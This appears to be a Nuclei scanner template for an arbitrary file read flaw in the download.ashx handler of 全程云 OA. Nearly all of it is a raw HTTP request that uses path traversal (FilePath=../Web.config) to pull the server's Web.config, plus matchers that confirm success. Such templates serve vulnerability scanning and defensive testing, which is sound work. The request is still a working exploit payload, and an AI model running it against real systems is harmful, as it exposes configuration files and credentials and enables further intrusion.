id: quanchengyun-OA-download-fileread

info:
  name: 全程云OA download.ashx存在任意文件读取漏洞
  author: quanchengyun
  severity: high
  tags: quanchengyun,OA,fileread

http:
  - raw:
      - |
        GET /OA/SMS/download.ashx?FilePath=../Web.config HTTP/1.1
        Host: {{Hostname}} 
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
        
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'config'
      - type: status
        status: 
          - 200